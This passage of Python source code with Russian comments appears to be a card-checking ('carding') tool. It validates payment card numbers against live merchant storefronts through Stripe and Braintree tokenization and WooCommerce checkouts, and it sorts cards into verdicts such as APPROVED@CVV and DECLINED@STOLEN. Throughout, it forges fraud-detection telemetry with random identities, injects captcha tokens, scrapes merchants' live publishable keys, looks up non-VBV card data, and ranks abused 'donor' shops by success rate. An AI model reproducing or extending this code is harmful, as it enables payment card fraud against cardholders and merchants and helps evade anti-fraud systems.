        if action.startswith("/"):
            from urllib.parse import urlparse
            p = urlparse(url)
            action = f"{p.scheme}://{p.netloc}{action}"
        fields = {}
        for inp in RE_HIDDEN_INPUT.findall(inner):
            nm = RE_INPUT_NAME.search(inp)
            vl = RE_INPUT_VALUE.search(inp)
            if nm and vl:
                fields[nm.group(1)] = vl.group(1)
        try:
            r2 = await session.post(action, data=fields, timeout=12, allow_redirects=True)
            html = r2.text
            url = str(r2.url)
        except Exception as e:
            return {"final_url": action, "html": html[:500], "posted": True, "error": str(e)}
    return {"final_url": url, "html": html[:2000], "posted": True, "error": ""}


def pi_secret_alive(pi_resp: dict) -> bool:
    """После неудачного confirm секрет жив, если PI вернулся в requires_payment_method
    (или ошибка card_error — карта отклонена, intent не отменён)."""
    st = pi_resp.get("status")
    if st == "requires_payment_method":
        return True
    err = pi_resp.get("error") or {}
    return err.get("type") == "card_error"


def classify_pi_verdict(pi_resp: dict) -> tuple[str, str]:
    """Полная таксономия вердиктов для PI-confirm (план §6.2).
    Возвращает (verdict, detail)."""
    if pi_resp.get("status") == "succeeded":
        return "APPROVED", f"PaymentIntent {pi_resp.get('id', '')} succeeded"
    if pi_resp.get("status") == "processing":
        # согласовано с hit_gate/_classify_and_resolve_3ds и store_api_confirm:
        # PI в процессинге — не отказ и не UNKNOWN, деньги в пути
        return "PI_PENDING", f"PaymentIntent {pi_resp.get('id', '')} processing"
    if pi_resp.get("status") == "requires_capture":
        return "APPROVED@HOLD", "authorized, capture_method=manual — холд без списания"
    na = pi_resp.get("next_action") or {}
    if pi_resp.get("status") == "requires_action" or na:
        sdk = na.get("use_stripe_sdk") or {}
        if na.get("redirect_to_url") or sdk.get("type") == "three_d_secure_redirect":
            return "3DS_REDIRECT", (na.get("redirect_to_url") or {}).get("url", "")
        return "3DS_REQUIRED", f"use_stripe_sdk type={sdk.get('type', '?')}"
    err = pi_resp.get("error") or {}
    code = (err.get("code") or "") + " " + (err.get("decline_code") or "")
    msg = err.get("message") or json.dumps(pi_resp)[:200]
    low = (code + " " + msg).lower()
    if "testmode" in low:
        return "TEST_MODE", msg
    if "rate_limit" in low or "too_many_requests" in low:
        return "RATE_LIMITED", msg
    if "insufficient_funds" in low:
        return "APPROVED@CVV", msg
    if "incorrect_cvc" in low or "invalid cvc" in low or "security code is incorrect" in low:
        return "APPROVED@CCN", msg
    if "expired" in low:
        return "EXPIRED", msg
    if "stolen" in low or "lost" in low:
        return "DECLINED@STOLEN", msg
    if "fraud" in low or "risk" in low:
        return "DECLINED@FRAUD", msg
    if "do_not_honor" in low or "do not honor" in low:
        return "DECLINED@DO_NOT_HONOR", msg
    if "incorrect_number" in low or "invalid_number" in low or "incorrect number" in low:
        return "INVALID", msg
    if "processing_error" in low or "try again" in low or "processing error" in low:
        return "RETRY", msg
    if err:
        return "DECLINED", msg
    return "UNKNOWN", msg


def stripe_telemetry(base_url: str, pk: str, country_code: str = "US",
                     muid: str = "", sid: str = "", email: str = "",
                     phone: str = "") -> dict:
    """Radar Telemetry v2021 — payment-element, deferred-intent, полный набор attribution.
    muid/sid: живые значения из Set-Cookie m.stripe.com/6 (parse_stripe_cookies);
    пустые → uuid4 fallback. guid остаётся uuid4 всегда (per-pageload)."""
    geo = geo_identity_fields(country_code)
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    email = email or f"{first.lower()}.{rand_str(7)}@{random.choice(EMAIL_DOMAINS)}"
    phone = phone or f"+{random.randint(1, 9)} 555 {random.randint(100, 999)} {random.randint(1000, 9999)}"
    return {
        "muid": muid or str(uuid.uuid4()),
        "sid": sid or str(uuid.uuid4()),
        "guid": str(uuid.uuid4()),
        "time_on_page": str(random.randint(18400, 48900)),
        "first_name": first,
        "last_name": last,
        "name": f"{first} {last}",
        "email": email,
        "phone": phone,
        **geo,
        "client_session_id": f"src_{rand_str(24)}",
        "elements_session_config_id": f"src_{rand_str(24)}",
        "payment_user_agent": f"stripe.js/{STRIPE_JS_BUILD}; stripe-js-v3/{STRIPE_JS_BUILD}; payment-element; deferred-intent",
        "key": pk,
        "_stripe_version": STRIPE_API_VERSION,
    }


def tokenize_body(card: dict, telem: dict, referrer: str) -> dict:
    body = {
        "type": "card",
        "billing_details[name]": telem["name"],
        "billing_details[address][line1]": telem.get("line1", ""),
        "billing_details[address][city]": telem["city"],
        "billing_details[address][state]": telem["state"],
        "billing_details[address][postal_code]": telem["postal_code"],
        "billing_details[address][country]": telem["country"],
        "card[number]": card["number"],
        "card[cvc]": card["cvc"],
        "card[exp_month]": str(card.get("month") or card.get("mm")),
        "card[exp_year]": str(card.get("year") or card.get("yy")),
        "allow_redisplay": "unspecified",
        "guid": telem["guid"],
        "muid": telem["muid"],
        "sid": telem["sid"],
        "pasted_fields": "number,cvc",
        "payment_user_agent": telem["payment_user_agent"],
        "referrer": referrer,
        "time_on_page": telem["time_on_page"],
        "client_attribution_metadata[client_session_id]": telem["client_session_id"],
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
        "client_attribution_metadata[elements_session_config_id]": telem["elements_session_config_id"],
        "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
        "key": telem["key"],
        "_stripe_version": telem["_stripe_version"],
    }
    if telem.get("email"):
        body["billing_details[email]"] = telem["email"]
    if telem.get("phone"):
        body["billing_details[phone]"] = telem["phone"]
    # radar_options[hcaptcha_token] — только когда токен реально добыт (stripecc1-мимикрия)
    hc = telem.get("_hcaptcha_token")
    if hc:
        body["radar_options[hcaptcha_token]"] = hc
    return body


TOKENIZE_HEADERS = {
    "Origin": "https://js.stripe.com",
    "Referer": "https://js.stripe.com/",
    "Accept": "application/json",
}


def confirmation_token_body(pm_id: str, pk: str, return_url: str = "",
                            shipping: dict | None = None) -> dict:
    """Формирует payload для создания ConfirmationToken из готового PaymentMethod.
    Поддерживает Two-Step Confirmation и UPE Optimized Checkout (2026)."""
    body = {
        "key": pk,
        "payment_method": pm_id,
    }
    if return_url:
        body["return_url"] = return_url
    if shipping:
        for k, v in shipping.items():
            if v:
                body[f"shipping[{k}]"] = str(v)
    return body


async def create_confirmation_token(session, pk: str, pm_id_or_card,
                                    telem: dict | None = None, return_url: str = "",
                                    referrer: str = "", timeout: int = 10) -> dict:
    """Генерирует ConfirmationToken (ctoken_...).
    Принимает либо готовый pm_... id, либо (card, telem) — в этом случае
    сначала создаёт PaymentMethod через tokenize_body, а затем оборачивает в ctoken."""
    if isinstance(pm_id_or_card, str) and pm_id_or_card.startswith("pm_"):
        pm_id = pm_id_or_card
    else:
        card = pm_id_or_card
        t = telem or stripe_telemetry(referrer or "https://example.com", pk)
        tok_body = tokenize_body(card, t, referrer or "https://example.com")
        r_tok = await session.post("https://api.stripe.com/v1/payment_methods",
                                   data=tok_body, headers=TOKENIZE_HEADERS, timeout=timeout)
        _log.log_http("POST", "https://api.stripe.com/v1/payment_methods", r_tok.status_code)
        tok_data = r_tok.json()
        if "id" not in tok_data:
            err = tok_data.get("error", {})
            _log.log_stripe("TOKENIZE_FAIL", mask_pan(card.get("number", "")), err.get("code", "error"), err.get("message", ""))
            return {
                "status": classify_verdict(str(err.get("message", "")) + str(err.get("code", ""))),
                "detail": err.get("message", str(tok_data))[:200],
                "error": err,
            }
        pm_id = tok_data["id"]
        _log.log_stripe("TOKENIZE_OK", pm_id, detail=mask_pan(card.get("number", "")))

    body = confirmation_token_body(pm_id, pk, return_url=return_url)
    r = await session.post("https://api.stripe.com/v1/confirmation_tokens",
                           data=body, headers=TOKENIZE_HEADERS, timeout=timeout)
    _log.log_http("POST", "https://api.stripe.com/v1/confirmation_tokens", r.status_code)
    tok_data = r.json()
    if "id" not in tok_data:
        err = tok_data.get("error", {})
        msg = err.get("message", "")
        code = err.get("code", "error")
        _log.log_stripe("CTOKEN_FAIL", pm_id, code, msg)
        return {
            "status": classify_verdict(str(msg) + str(code)),
            "detail": msg or str(tok_data)[:200],
            "error": err,
            "pm_id": pm_id,
        }
    ctoken_id = tok_data["id"]
    _log.log_stripe("CTOKEN_OK", ctoken_id, detail=pm_id)
    return {
        "status": "OK",
        "id": ctoken_id,
        "token": tok_data,
        "pm_id": pm_id,
    }


def ajax_headers_for(origin: str, referer: str) -> dict:
    return {
        "Origin": origin,
        "Referer": referer,
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json",
    }


def classify_verdict(err_msg: str) -> str:
    """SetupIntent-ветка: сообщения WP/Stripe → таксономия config.VERDICTS."""
    raw_err = (err_msg or "").lower()
    if "insufficient_funds" in raw_err or "insufficient funds" in raw_err:
        return "APPROVED@CVV"
    if "incorrect_cvc" in raw_err or "security code is incorrect" in raw_err or "invalid cvc" in raw_err:
        return "APPROVED@CCN"
    if "expired" in raw_err:
        return "EXPIRED"
    if "stolen" in raw_err or "lost" in raw_err:
        return "DECLINED@STOLEN"
    if "fraud" in raw_err or "risk" in raw_err:
        return "DECLINED@FRAUD"
    if "do_not_honor" in raw_err or "do not honor" in raw_err:
        return "DECLINED@DO_NOT_HONOR"
    if "incorrect_number" in raw_err or "invalid_number" in raw_err or "incorrect card number" in raw_err:
        return "INVALID"
    if "try again" in raw_err or "processing error" in raw_err:
        return "RETRY"
    # Ошибки несовместимости/сбоя шлюза магазина — это НЕ отказ банка карты
    if any(k in raw_err for k in ("missing payment details", "invalid or missing payment",
                                  "zahlungsangaben", "zahlungsarten", "payment_data",
                                  "payment method is correctly entered")):
        return "ERROR"
    return "DECLINED"


# Статусы SetupIntent — это НЕ тексты ошибок, classify_verdict их не покроет.
# Сырой str(st).upper() давал CANCELED / PROCESSING / REQUIRES_PAYMENT_METHOD
# вне config.VERDICTS: нет иконки, не попадает в хиты и, главное, != "ERROR",
# из-за чего credit-refund в боте не срабатывал.
_SETUP_INTENT_STATUS_MAP = {
    "succeeded": "APPROVED",
    "requires_action": "3DS_REQUIRED",
    "processing": "PI_PENDING",
    "canceled": "DECLINED",
    "requires_payment_method": "DECLINED",   # карта отвергнута на attach
    "requires_confirmation": "RETRY",
    "requires_capture": "APPROVED@HOLD",
}


def classify_setup_intent_status(status: str) -> str:
    """Статус SetupIntent из WP-ответа → таксономия config.VERDICTS.
    Неизвестный статус → UNKNOWN, но НИКОГДА не сырая строка наружу."""
    st = (status or "").strip().lower()
    return _SETUP_INTENT_STATUS_MAP.get(st, "UNKNOWN")


def is_nonce_rejection(conf_resp: dict) -> bool:
    """WP отвечает data:'-1'/0 или 'nonce' в сообщении, когда ajax-nonce протух."""
    data = conf_resp.get("data")
    if isinstance(data, str) and data.strip() in ("-1", "0"):
        return True
    msg = ""
    if isinstance(data, dict):
        msg = str(data.get("error", {}).get("message", "")) + str(data.get("message", ""))
    msg += str(conf_resp.get("message", ""))
    return "nonce" in msg.lower()


# --- Скоринг доноров и взвешенная ротация (Sprint 3.3/3.4) ---

def score_gate(gate_dict: dict) -> float:
    """weight = success_rate / latency × штрафы за капчу, фейлы, STALE."""
    sr = float(gate_dict.get("success_rate") or 0.5)
    lat = max(int(gate_dict.get("latency_avg_ms") or 1000), 100)
    w = sr / lat
    if gate_dict.get("captcha_on_add_card"):
        w *= 0.1
    fc = int(gate_dict.get("fail_count", 0) or 0)
    if fc:
        w *= 0.25 ** min(fc, 3)
    if gate_dict.get("status") == "STALE":
        w *= 0.2
    return max(w, 1e-6)


def pick_gate_order(pool: list[dict]) -> list[dict]:
    """Взвешенная случайная перестановка без повторений: сильные доноры чаще впереди,
    каждый из пула всё равно получает попытку (fallback-порядок)."""
    remaining = list(pool)
    order: list[dict] = []
    while remaining:
        weights = [score_gate(g) for g in remaining]
        i = random.choices(range(len(remaining)), weights=weights, k=1)[0]
        order.append(remaining.pop(i))
    return order


def bin_alpha2(binfo: dict) -> str:
    """alpha2 страны эмитента из разных форматов BIN-ответов."""
    if not binfo:
        return ""
    c = binfo.get("country") or {}
    if isinstance(c, dict):
        a2 = c.get("alpha2") or c.get("iso_code") or ""
        if not a2 and c.get("numeric"):
            # binlist numeric ISO 3166-1 -> быстрый мап топовых
            return {"840": "US", "124": "CA", "826": "GB", "036": "AU", "276": "DE",
                    "250": "FR", "380": "IT", "724": "ES", "528": "NL", "756": "CH",
                    "372": "IE", "554": "NZ", "076": "BR", "484": "MX", "356": "IN",
                    "392": "JP", "702": "SG", "616": "PL", "620": "PT", "056": "BE",
                    "040": "AT", "578": "NO", "208": "DK", "246": "FI", "203": "CZ",
                    "642": "RO", "792": "TR", "376": "IL", "710": "ZA"}.get(
                        str(c["numeric"]).zfill(3), "")
        return str(a2).upper()[:2]
    return ""


def _normalize_handyapi_bin(d: dict) -> dict:
    """handyapi отдаёт PascalCase (Scheme/Type/Issuer/Country.A2) — приводим
    к каноническому binlist-совместимому lowercase-виду."""
    c = d.get("Country") if isinstance(d.get("Country"), dict) else {}
    return {"scheme": d.get("Scheme"), "type": d.get("Type"),
            "bank": {"name": d.get("Issuer")},
            "country": {"alpha2": c.get("A2"), "name": c.get("Name")},
            "level": d.get("CardTier")}


def _bin_response_usable(d: dict) -> bool:
    """200 с ошибочным/пустым телом — не источник: хотя бы одно поле живо."""
    return bool(d.get("scheme") or (d.get("bank") or {}).get("name")
                or (d.get("country") or {}).get("alpha2"))


async def bin_lookup_enriched(bin6: str) -> dict:
    """6.3: все три источника, мерж; is_vbv для non-VBV детекта.
    antipublic первым (отдаёт level/vbv), binlist+handyapi добивают поля."""
    from curl_cffi.requests import AsyncSession
    merged: dict = {"scheme": None, "type": None, "bank": {"name": None},
                    "country": {}, "level": None, "is_vbv": None, "_src": []}
    async with AsyncSession(impersonate=_cfg.pick_impersonate(), verify=False) as s:
        for url, headers in (
            (f"https://bins.antipublic.cc/bins/{bin6}", {}),
            (f"https://lookup.binlist.net/{bin6}", {"Accept-Version": "3"}),
            (f"https://data.handyapi.com/bin/{bin6}", {}),
        ):
            try:
                r = await s.get(url, headers=headers, timeout=6)
                if r.status_code != 200:
                    continue
                d = r.json()
            except Exception:
                continue
            merged["_src"].append(url.split("/")[2])
            if "antipublic" in url:
                c_name = str(d.get("country_name", "")).lower()
                a2 = str(d.get("country") or "").upper() or _ANTIPUBLIC_A2.get(c_name, "")
                merged.update({"scheme": d.get("brand"), "type": d.get("type"),
                               "level": d.get("level"),
                               "bank": {"name": d.get("bank")},
                               "country": {"alpha2": a2, "name": d.get("country_name")}})
                vbv_raw = str(d.get("vbv", "") or "").strip().lower()
                if vbv_raw:
                    merged["is_vbv"] = vbv_raw not in ("0", "false", "not_enrolled", "no")
            elif "binlist" in url:
                merged["scheme"] = merged.get("scheme") or d.get("scheme")
                merged["type"] = merged.get("type") or d.get("type")
                if d.get("country") and not merged["country"].get("alpha2"):
                    merged["country"]["alpha2"] = d["country"].get("alpha2")
                if d.get("bank") and not merged["bank"].get("name"):
                    merged["bank"] = d.get("bank")
            else:  # handyapi (PascalCase -> нормализация)
                h = _normalize_handyapi_bin(d)
                if _bin_response_usable(h):
                    merged["scheme"] = merged.get("scheme") or h.get("scheme")
                    merged["type"] = merged.get("type") or h.get("type")
                    if h["bank"].get("name") and not merged["bank"].get("name"):
                        merged["bank"] = h["bank"]
                    if h["country"].get("alpha2") and not merged["country"].get("alpha2"):
                        merged["country"] = h["country"]
                    if h.get("level") and not merged.get("level"):
                        merged["level"] = h["level"]
    # эвристика: premium/бизнес уровни чаще enrolled — но без данных источника
    # честно оставляем None (unknown)
    return merged


async def token_only_check(s, pk: str, card_raw: str, referrer: str,
                           telem: dict | None = None) -> dict:
    """2.6: токенизация без confirm — cvc_check за $0. Отбраковка синтаксики
    и мёртвых карт до боевого гейта. Возвращает {status, detail}."""
    if not pk.startswith("pk_live"):
        return {"status": "ERROR", "detail": "prefilter pk missing"}
    card = parse_card(card_raw)
    telem = telem or stripe_telemetry(referrer, pk)
    tok_body = tokenize_body(card, telem, referrer)
    try:
        r = await s.post("https://api.stripe.com/v1/payment_methods",
                         data=tok_body, headers=TOKENIZE_HEADERS, timeout=8)
        d = r.json()
    except Exception as e:
        return {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:150]}
    if "id" in d:
        return {"status": "OK", "detail": f"token {d['id'][:18]}..."}
    err = d.get("error", {})
    code = str(err.get("code", ""))
    msg = str(err.get("message", ""))[:150]
    if code == "incorrect_cvc":
        return {"status": "WRONG_CVC", "detail": msg}
    if code in ("invalid_number", "incorrect_number"):
        return {"status": "INVALID", "detail": msg}
    if "expired" in msg.lower():
        return {"status": "EXPIRED", "detail": msg}
    if "api key" in msg.lower():
        return {"status": "RESTRICTED", "detail": msg}
    return {"status": classify_verdict(msg + code), "detail": msg}


RE_BRAINTREE_SETUP = re.compile(r'braintree\.setup\(\s*["\']([^"\']+)["\']')
RE_BRAINTREE_DATA_TOKEN = re.compile(r'data-braintree-token="([^"]+)"')
RE_BRAINTREE_CLIENT_TOKEN = re.compile(r'["\']((?:ey[A-Za-z0-9_-]{80,}\.?){1,2})["\']')
RE_BRAINTREE_TK = re.compile(r'(sandbox|production|development)_tk\w{10,}')


def extract_braintree_keys(html: str) -> dict:
    """Фаза 5.1: маркеры Braintree на странице -> client_token / tokenization_key.
    ВАЖНО: eyJ...-blob на витрине — часто Google/Facebook-аналитика в base64;
    валидный Braintree client_token обязан содержать authorizationFingerprint."""
    out = {"has_braintree": False, "client_token": "", "tokenization_key": ""}
    for m in RE_BRAINTREE_CLIENT_TOKEN.finditer(html):
        if braintree_parse_client_token(m.group(1)).get("fingerprint"):
            out["has_braintree"] = True
            out["client_token"] = m.group(1)
            break
    m2 = RE_BRAINTREE_TK.search(html)
    if m2:
        out["has_braintree"] = True
        out["tokenization_key"] = m2.group(0)
    if RE_BRAINTREE_SETUP.search(html) or RE_BRAINTREE_DATA_TOKEN.search(html):
        out["has_braintree"] = True
    return out


def braintree_parse_client_token(ct_b64: str) -> dict:
    """client_token = base64(JSON{authorizationFingerprint, clientApiUrl,...})."""
    import base64
    import json as _json
    pad = ct_b64 + "=" * (-len(ct_b64) % 4)
    try:
        d = _json.loads(base64.urlsafe_b64decode(pad))
    except Exception:
        return {}
    fp = d.get("authorizationFingerprint", "")
    url = d.get("configUrl", "")
    mid = ""
    if "/merchants/" in url:
        mid = url.split("/merchants/")[1].split("/")[0]
    return {"fingerprint": fp, "client_api_url": url, "merchant_id": mid}


async def braintree_vbv_check(s, html: str, card_raw: str,
                              referrer: str) -> dict:
    """Фаза 5.1: Braintree tokenize без списания -> живость карты по
    cvvResponseCode (M/N/S), 3DS-поля если отдаёт мерчант. Возвращает
    {status, detail}."""
    import json as _json
    keys = extract_braintree_keys(html)
    if not keys["has_braintree"]:
        return {"status": "ERROR", "detail": "no braintree markers on page"}
    card = parse_card(card_raw)
    headers = {
        "Origin": referrer.rstrip("/"),
        "Referer": referrer,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*", "X-Requested-With": "XMLHttpRequest",
    }
    # Путь А: client_token -> fingerprint -> legacy client_api
    ct = braintree_parse_client_token(keys["client_token"]) if keys["client_token"] else {}
    body: dict = {}
    api_url = ""
    if ct.get("fingerprint"):
        api_url = (ct["client_api_url"].replace("/client_api", "")
                   + "/client_api/v1/payment_methods/credit_cards"
                   if "/client_api" not in ct["client_api_url"]
                   else ct["client_api_url"] + "/v1/payment_methods/credit_cards")
        body = {
            "authorizationFingerprint": ct["fingerprint"],
            "sharedCustomerIdentifierType": "undefined",
            "sharedCustomerIdentifier": "",
            "payment_method_nonce": "",
            "creditCard[cardholderName]": "",
            "creditCard[number]": card["number"],
            "creditCard[expirationMonth]": str(card.get("month") or card.get("mm")),
            "creditCard[expirationYear]": str(card.get("year") or card.get("yy")),
            "creditCard[cvv]": card["cvc"],
            "billingAddress[postal_code]": "",
        }
    elif keys["tokenization_key"]:
        # Путь Б: токенизационный ключ -> GraphQL tokenizeCreditCard
        tkq = {
            "clientSdkMetadata": {"source": "form", "integration": "custom",
                                  "sessionId": uuid.uuid4().hex},
            "query": ("mutation Tokenize($input: TokenizeCreditCardInput!) "
                      "{ tokenizeCreditCard(input: $input) { paymentMethod { id "
                      "... on CreditCard { bin { identifiers prepaid healthcare "
                      "debit durbinRegulated commercial payroll issuingBank "
                      "countryOfIssuance productId } cardType last4 "
                      "expirationMonth expirationYear cvvResponseCode } } } }"),
            "variables": {"input": {"creditCard": {
                "number": card["number"],
                "expirationMonth": str(card.get("month") or card.get("mm")),
                "expirationYear": str(card.get("year") or card.get("yy")),
                "cvv": card["cvc"]},
                "options": {"validate": False}}},
            "operationName": "Tokenize",
        }
        try:
            r = await s.post("https://payments.braintree-api.com/graphql",
                             json={**tkq, "metaData": {"tokenizationKey": keys["tokenization_key"]}},
                             headers={"Origin": "https://assets.braintreegateway.com",
                                      "Content-Type": "application/json"}, timeout=12)
            _log.log_http("POST", "https://payments.braintree-api.com/graphql", r.status_code)
        except Exception as e:
            return {"status": "ERROR", "detail": f"gql post: {type(e).__name__}: {e}"[:150]}
        try:
            d = r.json()
            pm = ((d.get("data") or {}).get("tokenizeCreditCard") or {}).get("paymentMethod") or {}
        except Exception:
            return {"status": "ERROR", "detail": f"gql HTTP {r.status_code}"}
        if not pm:
            errs = ((d.get("errors") or [{}])[0])
            msg = str(errs.get("message", ""))[:120]
            cat = str(errs.get("extensions", {}).get("errorClass", ""))
            if cat == "VALIDATION":
                return {"status": "INVALID", "detail": msg}
            return {"status": "RESTRICTED", "detail": msg}
        return _braintree_verdict(pm)
        # путь А продолжается ниже
    if not body:
        return {"status": "ERROR", "detail": "no usable braintree credential"}
    try:
        r = await s.post(api_url, data=body, headers=headers, timeout=12)
        _log.log_http("POST", api_url, r.status_code)
        d = _json.loads(r.text)
    except Exception as e:
        return {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:150]}
    ccs = d.get("creditCards") or []
    if ccs:
        return _braintree_verdict(ccs[0])
    err = d.get("fieldErrors") or d.get("message") or d.get("error", {}).get("message")
    msg = _json.dumps(err)[:150] if err else f"HTTP {r.status_code}"
    if "invalid" in msg.lower() or "Number" in msg:
        return {"status": "INVALID", "detail": msg}
    return {"status": "ERROR", "detail": msg}


def _braintree_verdict(pm: dict) -> tuple[str, str] | dict:
    """Единый разбор ответа токенизации для обоих путей."""
    cvv_code = str(pm.get("cvvResponseCode") or "").upper()
    card_type = pm.get("cardType") or "?"
    last4 = pm.get("last4") or "?"
    tds = pm.get("threeDSecureInfo") or {}
    detail = f"{card_type} ****{last4} cvv={cvv_code or '?'}"
    if tds.get("enrolled"):
        detail += f" 3ds={'Y' if tds.get('liabilityShifted') else 'C'}"
    if cvv_code == "N":
        return {"status": "WRONG_CVC", "detail": detail}
    if cvv_code in ("M", "S"):
        status = "APPROVED"
        if tds.get("enrolled"):
            status = "3DS_FRICTIONLESS" if tds.get("liabilityShifted") else "3DS_CHALLENGE"
        return {"status": status, "detail": detail}
    return {"status": "INVALID", "detail": f"{card_type} ****{last4} rejected"}


_PM_WALLET_RX = re.compile(
    r"applepay|googlepay|ideal|bancontact|sepa|klarna|afterpay|affirm|alipay|"
    r"wechat|eps|p24|multibanco|boleto|oxxo|blik|fpx|becs|ach|grabpay|paypal|ppcp",
    re.I)

# Способы оплаты, которые карту не принимают в принципе. Без этого фильтра
# «последний шанс» в _pick_pm_slug хватает invoice/Rechnungskauf, checkout
# отвечает payment_method_disabled, а карта уже токенизирована и потрачена зря.
_PM_NONCARD_RX = re.compile(
    r"invoice|rechnung|kauf|cod|cash_on|cheque|check_payments|bacs|bank_transfer|"
    r"banktransfer|direct_bank|gateway_fee|store_credit|gift_card|" 
    r"purchase_order|cheque|cod|free", re.I)


def _pick_pm_slug(methods: list) -> str:
    """Слаг платёжки для checkout из cart.payment_methods.

    D-25: прежний порядок не знал про WooPayments и падал в дефолт «stripe»,
    которого на таких сайтах нет — checkout отвечал payment_method_disabled
    (atriumcoffeeroasters: methods = woocommerce_payments* + wps_paypal,
    «Apple Pay is not available»). Итоговый слаг ВСЕГДА сверяется со списком:
    вернуть то, чего нет на сайте — значит заведомо сжечь попытку.

    Порядок: точные card-слаги → stripe_cc → stripe → woo*/ppcp без wallet-слов
    → что угодно без wallet-слов → первый из списка.
    """
    if not methods:
        return "stripe"
    ms = [m for m in methods if isinstance(m, str)]
    if not ms:
        return "stripe"
    for slug in ("stripe_cc", "stripe", "woocommerce_payments", "card"):
        if slug in ms:
            return slug
    # Имя шлюза не обязано НАЧИНАТЬСЯ с «stripe»: fkwcs_stripe (FunnelKit),
    # wpg_stripe, wc_stripe_peach и т.п. — это карта. Ищем подстроку, иначе
    # теряем живые гейты (theposhpundit: fkwcs_stripe был отвергнут как «не карта»).
    for m in ms:
        if ("stripe" in m.lower() or m.startswith("woocommerce_payments")
                or m.startswith("ppcp")) and not _PM_WALLET_RX.search(m):
            return m
    # последний шанс: что угодно без wallet-слов и без безналичных «не карта»
    for m in ms:
        if not _PM_WALLET_RX.search(m) and not _PM_NONCARD_RX.search(m):
            return m
    # Ни одного card-совместимого — молотить invoice/«Rechnungskauf» бессмысленно:
    # checkout ответит payment_method_disabled, карта уже токенизирована.
    return ""


def pm_slug_valid(methods: list, slug: str) -> bool:
    """D-25: слаг обязан существовать на сайте. Пустой список — доверяем (фоллбэк)."""
    ms = [m for m in (methods or []) if isinstance(m, str)]
    return (not ms) or (slug in ms)


async def _resolve_variation(s, api: str, product: dict, nonlocal_nonce: list,
                             timeout: int = 10) -> list | None:
    """D-24: variable-товар -> список {attribute, value} для add-item.

    Голый id даёт 400 woocommerce_rest_missing_attributes (проверено боем на
    atriumcoffeeroasters: «Missing attributes for variable product»).
    Возвращает None, если вариацию достать не удалось.
    """
    pid = product.get("id")
    variations = product.get("variations")
    if not variations:
        try:
            r = await s.get(f"{api}/products/{pid}",
                            headers={"Nonce": nonlocal_nonce[0]}, timeout=timeout)
            nn = r.headers.get("nonce") or r.headers.get("Nonce")
            if nn:
                nonlocal_nonce[0] = nn
            variations = (r.json() or {}).get("variations") or []
        except Exception:
            return None
    if not variations:
        return None
    first = variations[0]
    if isinstance(first, dict):
        var_id = first.get("id")
        raw = first.get("attributes") or []
        out = []
        for a in raw:
            name = a.get("name") or a.get("attribute")
            val = a.get("value") or a.get("option")
            if name:
                out.append({"attribute": name, "value": val or ""})
        return {"id": var_id, "attributes": out} if (var_id or out) else None
    return None


def mutation_ok(resp, expect_key: str | None = None) -> tuple[bool, str]:
    """D-22 — инвариант мутаций: успех доказывает ФОРМА ОТВЕТА, а не HTTP-код.

    POST /cart/add-item на wisdomofplanets.com отвечает 302 → /product/...;
    клиент идёт по редиректу, получает 200 text/html, и старый код
    (`status_code in (200, 201)`) принимал это за «товар добавлен». Корзина
    оставалась пустой, checkout отвечал 409 woocommerce_rest_cart_empty —
    тихий фантом, выглядевший как успех.

    Мутация успешна, только если ответ — JSON ожидаемой формы.
    """
    ct = (resp.headers.get("content-type") or "").lower()
    if "json" not in ct:
        return False, "ADD_ITEM_NO_JSON"
    body = (resp.text or "").strip()
    if not body:
        return False, "ADD_ITEM_NO_JSON"
    try:
        j = resp.json()
    except Exception:
        return False, "ADD_ITEM_NO_JSON"
    if expect_key and not j.get(expect_key):
        return False, f"ADD_ITEM_NO_{expect_key.upper()}"
    return True, ""


async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                            country: str = "US",
                            max_price_cents: int = 200) -> dict:
    """Woo Store API прямой конфирм (Фаза 2, ветка Blocks-checkout):
    корзина -> checkout POST с реальным pm_id. ВАЖНО: это платёжная авторизация
    на сумму товара (не $0-auth) — берём самый дешёвый продукт, жёсткая крышка
    max_price_cents. Возвращает {status, detail, amount_cents, currency}."""
    import json as _json
    root = root.rstrip("/")
    store_lang = ""  # lang витрины -> фоллбэк страны, когда draft молчит
    if pk and pk.startswith("pk_live"):
        telem = stripe_telemetry(root, pk)
        telem.update(geo_identity_fields(country))
    else:
        # Быстрый поиск на витрине перед корзиной
        for path in ("/", "/checkout/", "/checkout", "/shop/"):
            try:
                r0 = await s.get(root + path, timeout=12)
                pk = extract_pk_live(r0.text) or ""
                if not store_lang:
                    m_lang = re.search(r'<html[^>]*lang="([a-z]{2})-', r0.text, re.I)
                    store_lang = (m_lang.group(1).upper() if m_lang else "")
            except Exception:
                continue
            if pk:
                break
        if pk and pk.startswith("pk_live"):
            telem = stripe_telemetry(root, pk)
            telem.update(geo_identity_fields(country))
        else:
            telem = None
    api = f"{root.rstrip('/')}/wp-json/wc/store/v1"

    try:
        r_cart = await s.get(f"{api}/cart", timeout=10)
        _log.log_http("GET", f"{api}/cart", r_cart.status_code)
        if r_cart.status_code != 200:
            return {"status": "ERROR",
                    "detail": f"Store API: cart HTTP {r_cart.status_code}",
                    "amount_cents": 0, "currency": ""}
        # доступные платёжные slugs магазина: слать ВЕРНЫЙ payment_method
        # с первого POST — иначе Woo схлопывает корзину после invalid-попытки
        # (magnesiumshop/wisdomofplanets: есть только stripe_cc, «stripe» нет)
        cart_payment_methods = []
        try:
            cart_payment_methods = (r_cart.json().get("payment_methods") or [])
        except Exception:
            cart_payment_methods = []

        def _take_nonce(resp) -> None:
            """Store API nonce одноразовый на мутацию — каждый ответ несёт свежий."""
            nn = (resp.headers.get("nonce")
                  or resp.headers.get("Nonce")
                  or resp.headers.get("X-WC-Store-API-Nonce"))
            if not nn:
                for k, v in resp.headers.items():
                    if k.lower() == "nonce":
                        nn = v
                        break
            if nn:
                nonlocal_nonce[0] = nn

        nonlocal_nonce = [""]
        _take_nonce(r_cart)
        nonce = nonlocal_nonce[0]
        if not nonce:
            return {"status": "ERROR", "detail": "Store API: no Nonce header",
